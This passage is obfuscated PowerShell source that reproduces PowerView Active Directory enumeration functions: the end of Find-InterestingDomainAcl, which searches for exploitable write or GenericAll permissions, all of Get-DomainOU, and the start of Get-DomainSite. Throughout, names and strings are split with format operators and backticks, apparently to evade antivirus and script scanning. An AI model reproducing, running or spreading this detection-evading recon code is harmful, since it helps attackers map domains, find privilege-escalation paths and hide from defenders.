        [Alias({"{2}{0}{1}" -f't','h','ADSPa'})]
        [String]
        ${sE`AR`chB`ASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{0}{2}"-f'Controlle','D','r','omain'})]
        [String]
        ${Se`RVER},

        [ValidateSet({"{1}{0}" -f 'ase','B'}, {"{0}{2}{1}" -f 'O','l','neLeve'}, {"{0}{1}" -f'Subtr','ee'})]
        [String]
        ${se`A`RCHScO`pE} = ("{1}{0}{2}"-f'e','Subtr','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`e`SULt`PAGEsiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${serVERT`i`ME`LIm`It},

        [Switch]
        ${t`om`BStonE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`EdeNtI`Al} =  ${Q`Fn}::"EmP`TY"
    )

    BEGIN {
        ${AcLa`R`GumEnTS} = @{}
        if (${P`S`BoUndP`A`RAmETERs}[("{1}{0}{2}{3}" -f 'eso','R','lveG','UIDs')]) { ${A`claR`gUMEN`Ts}[("{3}{0}{1}{2}"-f 'G','UID','s','Resolve')] = ${Reso`L`V`e`guidS} }
        if (${pSbOU`Ndp`AR`AM`e`TeRS}[("{1}{3}{0}{2}"-f'il','R','ter','ightsF')]) { ${A`CLAR`gUMen`Ts}[("{1}{0}{3}{2}"-f 'ight','R','ter','sFil')] = ${R`igHtSfILt`eR} }
        if (${pS`Bo`Un`dpArAm`ET`ERs}[("{3}{0}{2}{1}" -f'PFil','er','t','LDA')]) { ${A`c`laR`GUMENtS}[("{2}{0}{1}{3}"-f'D','AP','L','Filter')] = ${lda`p`F`ilTER} }
        if (${psBoUn`Dpa`RAmEt`e`RS}[("{3}{1}{2}{0}" -f 'e','ch','Bas','Sear')]) { ${acLarg`U`meNTS}[("{1}{0}{2}"-f 'earch','S','Base')] = ${SEA`RcH`BaSe} }
        if (${pSb`o`Un`dpA`RAmE`TeRs}[("{2}{1}{0}"-f'er','v','Ser')]) { ${a`ClaRg`Ume`NtS}[("{0}{1}"-f'Serv','er')] = ${S`ErVer} }
        if (${P`s`BOUND`pAraM`eTerS}[("{2}{1}{0}" -f'cope','hS','Searc')]) { ${Ac`lA`RgUMeN`TS}[("{2}{0}{1}" -f'chSc','ope','Sear')] = ${S`EAr`CHsC`OpE} }
        if (${PS`BOU`ND`pA`RAmeteRs}[("{1}{3}{0}{2}"-f'ag','Re','eSize','sultP')]) { ${AC`LA`RguMe`NTS}[("{3}{1}{2}{0}" -f 'ze','e','Si','ResultPag')] = ${ReSUlt`pA`g`e`SIze} }
        if (${PsBo`Und`Pa`R`AmET`ERs}[("{0}{4}{3}{2}{1}"-f'Server','t','Limi','e','Tim')]) { ${Ac`LARGUM`eN`Ts}[("{2}{1}{0}{3}" -f 'L','ime','ServerT','imit')] = ${s`erV`e`R`TImEliMiT} }
        if (${PSbouN`DP`ArA`m`etERS}[("{2}{3}{1}{0}"-f'one','mbst','T','o')]) { ${A`CLaRG`Um`E`NTS}[("{1}{2}{0}" -f 'one','T','ombst')] = ${TOM`Bs`ToNe} }
        if (${p`SbOUNdP`ARa`M`e`TERs}[("{0}{2}{1}" -f 'Cr','ntial','ede')]) { ${A`clARguMe`NTS}[("{1}{0}{3}{2}"-f'r','C','ntial','ede')] = ${CreD`e`Nti`AL} }

        ${ob`j`e`cTseARCh`erARG`Umen`TS} = @{
            ("{0}{2}{1}"-f'Pro','rties','pe') = ("{2}{1}{5}{3}{4}{0}"-f 's','macc','sa','tname,objectcla','s','oun')
            'Raw' = ${tr`Ue}
        }
        if (${Ps`BOUNd`pAR`AM`etERs}[("{1}{0}"-f'er','Serv')]) { ${O`B`JeC`T`SeaRCH`era`RguMeNTs}[("{1}{0}"-f'ver','Ser')] = ${SeRV`ER} }
        if (${psBOu`N`DP`AraMeters}[("{0}{1}{3}{2}"-f 'Search','S','ope','c')]) { ${ob`J`e`cTSe`Ar`CHErArG`UmENTs}[("{0}{1}{2}"-f'SearchSco','p','e')] = ${s`e`ArC`HScOpe} }
        if (${PS`Bou`NdPa`Ram`eTe`RS}[("{3}{2}{0}{1}"-f 'Si','ze','e','ResultPag')]) { ${O`B`JEc`T`seArCherarGuMen`Ts}[("{2}{1}{3}{4}{0}"-f'Size','l','Resu','t','Page')] = ${RE`s`UL`TpAgesi`ZE} }
        if (${P`sBOUn`DP`ARAMEtE`Rs}[("{2}{0}{1}{3}" -f'erTime','Li','Serv','mit')]) { ${O`BJ`E`ctSEARc`heRArGuME`NTs}[("{0}{3}{2}{1}{4}"-f'Se','mi','verTimeLi','r','t')] = ${servE`RtIm`Eli`m`It} }
        if (${p`Sb`o`UNDpa`R`AMETErs}[("{1}{0}"-f'mbstone','To')]) { ${Obj`E`cTSeArCHE`Ra`Rg`U`MENTs}[("{0}{2}{1}"-f'Tombs','e','ton')] = ${TomB`s`To`NE} }
        if (${PsB`o`UNdPa`Ra`MetErs}[("{2}{1}{0}" -f'l','ntia','Crede')]) { ${Objec`T`SEa`Rc`HErar`gUmEnts}[("{0}{1}{3}{2}"-f 'Creden','t','l','ia')] = ${CrEDE`NTI`AL} }

        ${adNamE`A`RG`UMEn`TS} = @{}
        if (${PS`BOUN`dPA`RameterS}[("{0}{1}"-f 'Se','rver')]) { ${aDn`AmEar`Gume`Nts}[("{0}{2}{1}"-f'S','er','erv')] = ${SE`Rv`er} }
        if (${P`sBOUndpAR`Am`eTERs}[("{1}{0}{2}"-f 'ti','Creden','al')]) { ${adnA`MeAr`gU`Ments}[("{0}{2}{1}" -f'Cr','ntial','ede')] = ${credEn`TI`AL} }

        
        ${Re`SO`lVEdSiDs} = @{}
    }

    PROCESS {
        if (${PSB`ouND`PARa`MEte`RS}[("{1}{0}{2}"-f'ai','Dom','n')]) {
            ${AcL`A`RgUmeN`TS}[("{1}{0}"-f'main','Do')] = ${D`OmA`in}
            ${aDn`A`Me`A`RGUMeNTs}[("{1}{0}"-f 'main','Do')] = ${doM`Ain}
        }

        &("{4}{1}{3}{2}{0}" -f 'Acl','a','Object','in','Get-Dom') @ACLArguments | &("{0}{3}{1}{2}" -f'Fo','bj','ect','rEach-O') {

            if ( (${_}."a`CtIv`eDi`REC`T`oRYRIGHTS" -match ((("{0}{1}{8}{7}{6}{5}{4}{2}{3}"-f 'Ge','nericAll{0','0}','Delete','te{','a','{0}Cre','rite','}W')) -f [chAR]124)) -or ((${_}."act`IV`Edi`RECto`R`YrIgh`TS" -match ("{1}{0}{2}" -f 'd','Exten','edRight')) -and (${_}."aCe`qu`ALIF`ier" -match ("{0}{1}"-f 'All','ow')))) {
                
                if (${_}."s`ec`URI`TYIDENt`iFi`eR"."V`AlUE" -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if (${rEs`olvEDs`idS}[${_}."secuRiT`yi`d`ENTI`F`iEr"."Va`LUE"]) {
                        ${i`dE`NT`ityREFeREN`CeNa`me}, ${IdEnti`TYre`FErENCed`o`maiN}, ${i`DenTITYr`eFE`R`encE`dn}, ${idEn`T`I`Tyr`eFERence`CL`ASS} = ${rE`s`OL`VEDSIDs}[${_}."SEcU`RItY`iDe`NTI`FIER"."v`ALue"]

                        ${iNT`Eres`T`I`NGaCl} = &("{2}{1}{0}"-f'w-Object','e','N') ("{0}{2}{1}"-f 'PS','bject','O')
                        ${InTE`RE`s`TINGacL} | &("{0}{3}{1}{2}"-f'A','d-Me','mber','d') ("{2}{1}{0}" -f'y','t','NoteProper') ("{1}{0}"-f 'N','ObjectD') ${_}."OBJ`e`cTDn"
                        ${in`Te`ReS`TInGacl} | &("{0}{2}{1}"-f'Ad','ber','d-Mem') ("{3}{0}{1}{2}"-f 'eProp','er','ty','Not') ("{2}{3}{1}{0}" -f 'ier','lif','Ac','eQua') ${_}."a`cEquAlIF`I`Er"
                        ${inTer`ESt`iN`gAcL} | &("{2}{1}{0}"-f 'r','Membe','Add-') ("{1}{0}{3}{2}"-f 'roper','NoteP','y','t') ("{6}{0}{1}{5}{4}{3}{2}"-f'iveDire','cto','s','ht','g','ryRi','Act') ${_}."acti`Ve`D`IReCToR`yRiGhTS"
                        if (${_}."O`B`JectA`cetyPE") {
                            ${i`N`TerESTI`N`GaCl} | &("{2}{1}{0}" -f'mber','dd-Me','A') ("{1}{2}{0}" -f 'erty','N','oteProp') ("{3}{1}{2}{0}" -f 'Type','c','tAce','Obje') ${_}."ob`JEC`TaCEtYpe"
                        }
                        else {
                            ${IN`TER`e`s`TInGAcl} | &("{1}{2}{0}"-f 'ber','Add','-Mem') ("{1}{0}{2}{3}" -f'r','NoteP','ope','rty') ("{0}{1}{2}" -f'O','bject','AceType') ("{0}{1}" -f 'No','ne')
                        }
                        ${In`TeR`e`stIngaCl} | &("{1}{2}{0}"-f 'ber','Add-M','em') ("{0}{1}{2}{3}" -f 'No','teP','roper','ty') ("{0}{1}{2}" -f'AceFla','g','s') ${_}."Ace`FLAGS"
                        ${I`Nt`EresT`ing`Acl} | &("{0}{2}{1}"-f'A','mber','dd-Me') ("{1}{0}{2}" -f'ropert','NoteP','y') ("{0}{2}{1}"-f'A','pe','ceTy') ${_}."acEtY`pe"
                        ${iNTEr`Es`T`iNgacL} | &("{0}{1}{2}" -f 'Add-','Memb','er') ("{3}{0}{1}{2}" -f'otePrope','rt','y','N') ("{2}{0}{1}{3}"-f'nher','itanceFla','I','gs') ${_}."INhe`RItAnCeFl`A`gs"
                        ${I`NTereStIN`gACl} | &("{0}{1}{2}"-f 'Add-','Mem','ber') ("{2}{0}{3}{1}"-f 'o','ty','N','teProper') ("{1}{2}{3}{5}{0}{4}" -f 'entifi','Secu','r','ityI','er','d') ${_}."sEcuRiTY`IdEn`Ti`Fier"
                        ${in`TerEsT`In`gaCl} | &("{0}{2}{1}" -f 'A','Member','dd-') ("{2}{3}{0}{1}" -f'o','perty','NoteP','r') ("{5}{3}{1}{2}{0}{4}" -f 'ceNa','e','n','tityRefer','me','Iden') ${I`deNtIt`yre`FerenCeNA`Me}
                        ${InteRE`St`In`Ga`cL} | &("{0}{3}{1}{2}"-f'Ad','Membe','r','d-') ("{2}{0}{3}{1}" -f 'ope','ty','NotePr','r') ("{4}{6}{3}{2}{0}{5}{1}" -f 'Re','Domain','tity','n','I','ference','de') ${I`dEN`T`ITYReFere`NCeD`OMA`in}
                        ${i`N`TeREsTI`NGacl} | &("{2}{0}{1}" -f 'embe','r','Add-M') ("{0}{1}{2}" -f 'NoteProp','e','rty') ("{3}{1}{4}{2}{0}"-f 'renceDN','it','e','Ident','yRef') ${I`DEnTIt`YrEfE`R`enCEDN}
                        ${I`NTEReST`IngA`Cl} | &("{2}{1}{0}" -f'r','Membe','Add-') ("{0}{1}{3}{2}"-f 'N','oteP','rty','rope') ("{4}{2}{1}{3}{6}{5}{0}" -f's','efe','ntityR','rence','Ide','las','C') ${IDE`N`TiTyREF`ER`EN`cecLASS}
                        ${INt`er`e`sTinGA`CL}
                    }
                    else {
                        ${iDEnTI`TYRefE`ReNc`e`Dn} = &("{1}{2}{0}{3}" -f'rt','Con','ve','-ADName') -Identity ${_}."sE`CuritYidENti`F`iEr"."V`AlUE" -OutputType ('DN') @ADNameArguments
                        

                        if (${Id`entiT`YREfEREnc`edn}) {
                            ${id`en`TIt`Y`RefeREnc`E`DOM`AIN} = ${idENt`IT`yrEf`e`RE`NC`Edn}.("{0}{2}{1}"-f'S','String','ub').Invoke(${id`entiT`Y`RefE`RE`N`cedN}.("{1}{0}"-f 'ndexOf','I').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            
                            ${o`Bj`ects`e`ARCher`ArGUm`e`NtS}[("{0}{1}" -f 'Do','main')] = ${iDENT`IT`YRE`F`EReN`CeDOMAin}
                            ${Ob`J`eCtse`AR`cHE`Ra`RGuMeNTS}[("{2}{0}{1}" -f'de','ntity','I')] = ${IDEn`T`ITyrEFeREn`CEdN}
                            
                            ${O`BJ`EcT} = &("{0}{3}{1}{2}" -f'G','in','Object','et-Doma') @ObjectSearcherArguments

                            if (${ob`jEcT}) {
                                ${I`DENT`ITYr`efErencE`NAme} = ${o`BjeCT}."P`ROp`ErTies"."s`AMACc`ou`NtNAmE"[0]
                                if (${Ob`jeCt}."pROp`ertI`ES"."Obje`ct`cl`ASS" -match ("{0}{1}{2}"-f'com','pute','r')) {
                                    ${IDe`N`Ti`TyREferen`C`EcL`ASS} = ("{0}{1}{2}"-f 'c','omp','uter')
                                }
                                elseif (${O`BjeCt}."pROPE`RtI`es"."obJ`e`C`TcLAss" -match ("{1}{0}" -f 'up','gro')) {
                                    ${iDenTi`T`yr`EfE`ReNCECl`ASS} = ("{0}{1}"-f 'grou','p')
                                }
                                elseif (${o`B`jECT}."P`Roper`TI`Es"."o`BJEC`Tclass" -match ("{0}{1}"-f 'u','ser')) {
                                    ${iD`enTIT`yr`EfERENC`eclass} = ("{1}{0}"-f'r','use')
                                }
                                else {
                                    ${iDentiT`YrEfErEn`Cec`L`Ass} = ${NU`LL}
                                }

                                
                                ${re`sOLV`Ed`SiDS}[${_}."SECuR`I`TYIDEntiF`i`er"."vAl`Ue"] = ${IdeNTi`Ty`RE`FE`R`EnCeNa`me}, ${IDEntItyrEfEr`e`NC`e`DoMAIn}, ${id`eNTiTyREFe`Ren`ce`dN}, ${IDEnTi`TyReFe`ReNce`Cl`AsS}

                                ${IntER`esTI`NgA`CL} = &("{0}{2}{1}"-f 'New-','ect','Obj') ("{2}{1}{0}" -f 't','ec','PSObj')
                                ${I`NTEr`eStin`g`AcL} | &("{2}{0}{1}" -f '-','Member','Add') ("{1}{2}{3}{0}" -f'ty','Not','eP','roper') ("{0}{2}{1}" -f'Ob','DN','ject') ${_}."OBjE`Ct`Dn"
                                ${I`NTe`ReSTINgA`CL} | &("{3}{1}{0}{2}"-f 'em','d-M','ber','Ad') ("{3}{2}{0}{1}" -f 't','y','oteProper','N') ("{3}{1}{2}{0}"-f'ifier','Qua','l','Ace') ${_}."A`CE`Q`Ualifier"
                                ${IN`TE`REs`TI`NgacL} | &("{3}{1}{0}{2}"-f 'em','-M','ber','Add') ("{0}{2}{1}"-f 'NotePr','rty','ope') ("{0}{2}{1}{3}{5}{4}" -f'A','ctory','ctiveDire','Rig','ts','h') ${_}."aC`TI`VE`DIreCt`oRYR`iGHTS"
                                if (${_}."O`Bje`c`TaCeT`YPe") {
                                    ${i`NtereS`Tin`gA`cL} | &("{0}{2}{1}" -f 'Add-M','er','emb') ("{2}{0}{1}"-f 'P','roperty','Note') ("{0}{1}{2}" -f'Obj','ectA','ceType') ${_}."O`BjECt`AcEtYpE"
                                }
                                else {
                                    ${i`NtErEsT`iNgacL} | &("{0}{3}{1}{2}"-f 'Add-M','m','ber','e') ("{3}{2}{1}{0}" -f 'rty','rope','P','Note') ("{0}{2}{1}"-f'Object','ype','AceT') ("{0}{1}"-f 'No','ne')
                                }
                                ${I`Nt`eres`Tinga`Cl} | &("{1}{2}{0}"-f 'mber','Add','-Me') ("{3}{2}{1}{0}" -f'roperty','teP','o','N') ("{1}{0}" -f'ceFlags','A') ${_}."A`cEFL`AGs"
                                ${inteRe`StinGA`cL} | &("{2}{1}{0}"-f'r','-Membe','Add') ("{0}{2}{1}" -f'No','ty','teProper') ("{1}{2}{0}" -f 'Type','Ac','e') ${_}."aCET`ypE"
                                ${iNTeRESti`N`g`ACl} | &("{1}{0}{2}"-f '-Me','Add','mber') ("{2}{3}{0}{1}" -f 'e','rty','NotePr','op') ("{4}{2}{1}{3}{0}"-f 's','ta','ri','nceFlag','Inhe') ${_}."In`HERITAN`cEfLA`Gs"
                                ${int`EreStIng`A`cl} | &("{1}{2}{0}"-f 'ember','A','dd-M') ("{1}{3}{2}{0}"-f 'y','Not','ert','eProp') ("{1}{4}{0}{2}{3}{5}"-f'den','Security','ti','fie','I','r') ${_}."SEC`URiT`YIDe`N`TIF`IEr"
                                ${IN`T`ErEs`Tin`GACL} | &("{3}{2}{0}{1}" -f 'b','er','m','Add-Me') ("{2}{0}{1}"-f'ePrope','rty','Not') ("{2}{3}{1}{4}{0}"-f 'eName','r','IdentityRe','fe','enc') ${ID`eNt`ITYR`Ef`ERENc`EN`AMe}
                                ${I`Nt`Er`ES`TiNgACL} | &("{0}{3}{2}{1}"-f'Add-M','r','be','em') ("{0}{1}{2}{3}"-f'Not','eP','ro','perty') ("{2}{4}{3}{0}{1}{5}" -f'en','ceD','Id','tityRefer','en','omain') ${I`d`EntiT`Y`Refe`REnc`EdomaiN}
                                ${INtERe`s`Ti`NG`ACL} | &("{1}{0}{2}" -f 'm','Add-Me','ber') ("{2}{1}{0}{3}" -f 'r','pe','NotePro','ty') ("{0}{2}{1}{4}{3}"-f 'Id','ityRefere','ent','N','nceD') ${I`DEn`Ti`T`Yref`ErencedN}
                                ${iNT`eR`eST`In`GAcL} | &("{2}{0}{1}"-f'd','-Member','Ad') ("{0}{1}{2}" -f 'NoteP','rope','rty') ("{0}{4}{2}{1}{3}"-f 'Id','e','r','nceClass','entityRefe') ${i`dEntiTy`REFERencE`c`lASs}
                                ${I`NTeREs`TiNG`ACL}
                            }
                        }
                        else {
                            &("{3}{4}{2}{1}{0}" -f 'ng','i','te-Warn','Wr','i') "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName "
                        }
                    }
                }
            }
        }
    }
}


function ge`T-DOMain`ou {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{2}"-f'ho','PSS','dProcess','ul'}, '')]
    [OutputType({"{2}{0}{1}"-f '.','OU','PowerView'})]
    [CmdletBinding()]
    Param (
        [Parameter(posITion = 0, vaLuEfROMPIPElINe = ${T`RUe}, VALUEfrOmpipEliNEBYpROPERtYNAmE = ${T`RUe})]
        [Alias({"{1}{0}" -f'e','Nam'})]
        [String[]]
        ${IDE`Nt`ItY},

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias({"{1}{0}" -f'ID','GU'})]
        ${gp`linK},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`O`mAIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'ilter','F'})]
        [String]
        ${Ld`Apf`I`LTer},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pr`Oper`T`IES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'h','A','DSPat'})]
        [String]
        ${SeArCh`B`Ase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{2}{0}" -f'er','D','ntroll','omainCo'})]
        [String]
        ${s`E`RVER},

        [ValidateSet({"{0}{1}" -f'Ba','se'}, {"{2}{0}{1}" -f'Leve','l','One'}, {"{1}{0}" -f'btree','Su'})]
        [String]
        ${SEAr`cHSCO`PE} = ("{1}{2}{0}" -f'tree','Su','b'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`SUL`TPagEs`ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sEr`VErtim`e`LI`mIT},

        [ValidateSet({"{0}{1}"-f'D','acl'}, {"{1}{0}"-f'oup','Gr'}, {"{1}{0}"-f 'one','N'}, {"{1}{0}"-f'ner','Ow'}, {"{1}{0}"-f'cl','Sa'})]
        [String]
        ${SeC`URiTy`maSks},

        [Switch]
        ${t`Omb`StonE},

        [Alias({"{0}{2}{1}"-f 'R','rnOne','etu'})]
        [Switch]
        ${Fin`do`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cred`en`TI`AL} =   (itEm  ("{2}{3}{0}{1}"-f ':Qf','N','VARi','aBLe')  )."vAL`UE"::"E`mpTy",

        [Switch]
        ${r`AW}
    )

    BEGIN {
        ${Se`ArCHerarGU`MEN`TS} = @{}
        if (${p`S`B`ouNdpArAMe`TERs}[("{2}{0}{1}"-f'o','main','D')]) { ${SEaRc`HE`Ra`RgU`mentS}[("{2}{0}{1}"-f'omai','n','D')] = ${Do`mA`In} }
        if (${pSbo`UNd`parAMEt`E`Rs}[("{0}{1}{2}" -f 'Proper','t','ies')]) { ${SEaR`ch`eR`ArgUmeNtS}[("{0}{1}{2}" -f 'P','r','operties')] = ${Prop`ErtI`es} }
        if (${pS`B`ound`p`ARaM`eteRs}[("{2}{3}{0}{1}" -f 's','e','Search','Ba')]) { ${sear`CH`ErA`RgUm`EN`TS}[("{1}{3}{0}{2}"-f'rch','S','Base','ea')] = ${SEAR`CHB`AsE} }
        if (${PsbO`U`NdPAr`AME`TE`RS}[("{0}{1}"-f'Ser','ver')]) { ${s`EArCheRArGU`M`e`N`Ts}[("{2}{0}{1}"-f'e','r','Serv')] = ${s`ERver} }
        if (${PsbouNDPArAM`E`TE`Rs}[("{1}{2}{0}" -f'e','SearchSco','p')]) { ${sEArchE`Rar`G`Uments}[("{3}{2}{0}{1}" -f 'hSc','ope','earc','S')] = ${SeaR`CH`s`CoPE} }
        if (${psB`ouN`DPAraMe`Te`Rs}[("{0}{2}{3}{1}" -f 'ResultP','e','a','geSiz')]) { ${seArCHEra`Rg`UmeN`TS}[("{0}{2}{3}{1}" -f'Resul','ze','tPa','geSi')] = ${rEsul`TPaGE`s`i`ZE} }
        if (${P`sB`ounD`ParAmE`Te`RS}[("{0}{3}{1}{2}"-f'S','erT','imeLimit','erv')]) { ${sE`Ar`CH`eRaRG`UmEN`Ts}[("{1}{2}{0}{3}"-f'm','ServerTim','eLi','it')] = ${sErv`E`RtiMeL`ImIt} }
        if (${PsbO`UN`dPAR`AMEt`eRS}[("{3}{1}{2}{0}"-f 'asks','t','yM','Securi')]) { ${sEARc`h`eRARgu`mEN`Ts}[("{0}{2}{1}" -f'SecurityMas','s','k')] = ${sec`URitY`m`ASkS} }
        if (${psboU`Nd`p`ARAM`ETerS}[("{0}{1}"-f 'Tomb','stone')]) { ${sEARcHeR`ARguMe`N`Ts}[("{0}{1}" -f'To','mbstone')] = ${T`O`MBstone} }
        if (${PS`BOU`NDP`Aram`EteRS}[("{0}{2}{1}" -f 'C','al','redenti')]) { ${seArcher`A`R`guMENtS}[("{3}{1}{0}{2}"-f'n','ede','tial','Cr')] = ${c`ReD`eNtial} }
        ${oUse`A`R`cHEr} = &("{0}{3}{1}{2}" -f 'G','rc','her','et-DomainSea') @SearcherArguments
    }

    PROCESS {
        if (${oUs`E`ARChER}) {
            ${I`dEnTI`TYfI`l`TeR} = ''
            ${FIl`TEr} = ''
            ${iDent`i`Ty} | &("{2}{1}{0}"-f 't','ec','Where-Obj') {${_}} | &("{0}{2}{3}{1}" -f'F','ject','orEach','-Ob') {
                ${IdENTi`TyINSta`N`Ce} = ${_}.("{0}{1}" -f 'Re','place').Invoke('(', '\28').("{1}{0}{2}"-f'e','R','place').Invoke(')', '\29')
                if (${I`de`NtIT`yinsTANCe} -match ("{1}{0}" -f '=.*','^OU')) {
                    ${Ide`Ntit`yfi`LtER} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${PSB`ou`NDPa`Ramet`ERS}[("{0}{1}" -f 'D','omain')]) -and (-not ${psb`Oundp`ArA`mEteRs}[("{0}{2}{1}"-f'Searc','Base','h')])) {
                        
                        
                        ${IDeNtI`TyD`Om`AiN} = ${I`d`ENtiTYi`Nst`ANCE}.("{0}{2}{1}"-f 'Su','ing','bStr').Invoke(${I`dEnTItYINs`Ta`NCE}.("{0}{1}" -f'Ind','exOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{0}{2}{3}{1}"-f'Write-','ose','Ver','b') ('['+'G'+'et-Domai'+'nO'+'U] '+'Extr'+'ac'+'ted '+'d'+'omain '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${SeA`RcHeRaRG`Um`eNTs}[("{0}{1}" -f 'Do','main')] = ${id`EnTity`DOm`A`iN}
                        ${O`UsE`A`RcheR} = &("{3}{2}{1}{0}"-f'earcher','S','et-Domain','G') @SearcherArguments
                        if (-not ${Ous`EArCh`er}) {
                            &("{0}{4}{2}{3}{1}" -f 'W','g','Warn','in','rite-') ('[Get-Domai'+'n'+'OU] '+'U'+'nable '+'to'+' '+'re'+'tr'+'ieve '+'dom'+'ain '+'sea'+'rcher'+' '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        ${g`UidByt`esTrinG} = (-Join (([Guid]${IDeNtIty`iNS`T`ANCe}).("{0}{1}{2}{3}" -f 'T','oByt','e','Array').Invoke() | &("{1}{3}{2}{0}"-f't','ForEach','bjec','-O') {${_}.("{1}{2}{0}"-f 'ing','ToS','tr').Invoke('X').("{1}{2}{0}"-f't','PadL','ef').Invoke(2,'0')})) -Replace (("{1}{0}"-f')','(..')),'\$1'
                        ${id`E`NtITYF`iltEr} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${ideNtI`TyfI`LtEr} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${ide`N`T`itYFIl`Ter} -and (${Id`e`NtitYfI`ltEr}.("{0}{1}"-f 'Tri','m').Invoke() -ne '') ) {
                ${F`I`LTer} += "(|$IdentityFilter)"
            }

            if (${pSBoUN`DpARA`m`eT`E`RS}[("{0}{1}{2}" -f'GP','Li','nk')]) {
                &("{3}{2}{1}{0}" -f'se','rbo','te-Ve','Wri') ('['+'G'+'e'+'t-'+'DomainOU] '+'Se'+'arching'+' '+'fo'+'r '+'OUs'+' '+'wit'+'h '+"$GPLink "+'s'+'et '+'in'+' '+'th'+'e '+'gpLi'+'nk'+' '+'pro'+'pert'+'y')
                ${f`IltER} += "(gplink=*$GPLink*)"
            }

            if (${PSBOu`NdPARaM`E`TE`RS}[("{0}{2}{1}"-f'L','ter','DAPFil')]) {
                &("{0}{3}{1}{2}"-f'W','e-Verb','ose','rit') ('['+'Get-D'+'o'+'mainOU]'+' '+'Usin'+'g'+' '+'a'+'ddi'+'tional'+' '+'LDA'+'P '+'filt'+'er: '+"$LDAPFilter")
                ${fI`L`TER} += "$LDAPFilter"
            }

            ${OuSE`Ar`cheR}."fIL`TER" = "(&(objectCategory=organizationalUnit)$Filter)"
            &("{0}{2}{4}{1}{3}"-f'Wr','s','ite-Verb','e','o') "[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter) "

            if (${pSBO`U`ND`PaRAMeTerS}[("{1}{2}{0}"-f'dOne','Fi','n')]) { ${resU`Lts} = ${ous`e`ARCHeR}.("{0}{1}" -f'Fi','ndOne').Invoke() }
            else { ${REsu`LtS} = ${OUsEa`RC`h`er}.("{2}{1}{0}"-f'dAll','n','Fi').Invoke() }
            ${r`e`Sults} | &("{1}{0}{2}{3}" -f 'ere-','Wh','O','bject') {${_}} | &("{2}{0}{3}{1}{4}" -f 'r','je','Fo','Each-Ob','ct') {
                if (${PSb`oUN`Dpar`AMEt`E`Rs}['Raw']) {
                    
                    ${O`U} = ${_}
                }
                else {
                    ${oU} = &("{3}{2}{0}{1}"-f 'LDAPProper','ty','nvert-','Co') -Properties ${_}."Pr`o`PeRtIEs"
                }
                ${Ou}."PSo`BJE`cT"."t`Yp`En`AmES".("{0}{1}"-f'Inse','rt').Invoke(0, ("{3}{0}{2}{1}" -f'owe','w.OU','rVie','P'))
                ${o`U}
            }
            if (${rEsu`Lts}) {
                try { ${r`e`SuLtS}.("{0}{2}{1}"-f 'd','spose','i').Invoke() }
                catch {
                    &("{2}{0}{1}"-f'-Verb','ose','Write') ('[Get-'+'Do'+'m'+'ainOU]'+' '+'E'+'rror '+'dispos'+'in'+'g '+'of'+' '+'th'+'e '+'Res'+'ults '+'obje'+'ct'+': '+"$_")
                }
            }
            ${Ou`SE`ARcH`eR}.("{2}{1}{0}"-f 'se','ispo','d').Invoke()
        }
    }
}


function ge`T-dOMa`IN`SI`Te {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{2}{1}"-f 'P','s','s','SShouldProce'}, '')]
    [OutputType({"{1}{2}{3}{0}" -f 'Site','Powe','rV','iew.'})]
    [CmdletBinding()]
    Param (
        [Parameter(PoSitiON = 0, vaLuefROMPIPELInE = ${tr`UE}, vaLuefROmPIPELiNEbyProPERTYnAmE = ${tr`UE})]
        [Alias({"{0}{1}"-f'Nam','e'})]
        [String[]]
        ${iD`EN`TI`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias({"{1}{0}"-f'D','GUI'})]
        ${G`pL`inK},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`maiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'Fi','lter'})]
        [String]
        ${Ld`APFi`LTeR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PrO`p`er`TieS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'ADSPa','th'})]
        [String]
        ${SE`ArChB`A`se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{2}{0}" -f'r','Dom','ntrolle','ainCo'})]
        [String]
        ${Se`R`VER},

        [ValidateSet({"{1}{0}"-f'ase','B'}, {"{2}{0}{1}"-f'Le','vel','One'}, {"{0}{1}" -f'Su','btree'})]
        [String]
        ${SEa`R`cHScope} = ("{2}{1}{0}" -f 'ree','ubt','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`Sult`PA`GESIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SErVErT`i`mE`LImit},

        [ValidateSet({"{1}{0}"-f'l','Dac'}, {"{0}{1}" -f 'Gr','oup'}, {"{0}{1}"-f 'No','ne'}, {"{0}{1}" -f 'Own','er'}, {"{0}{1}" -f'Sa','cl'})]
        [String]
        ${S`ec`UrITYm`Asks},

        [Switch]
        ${toMb`S`T`ONe},

        [Alias({"{2}{0}{1}" -f'nOn','e','Retur'})]
        [Switch]
        ${fi`Nd`ONE},

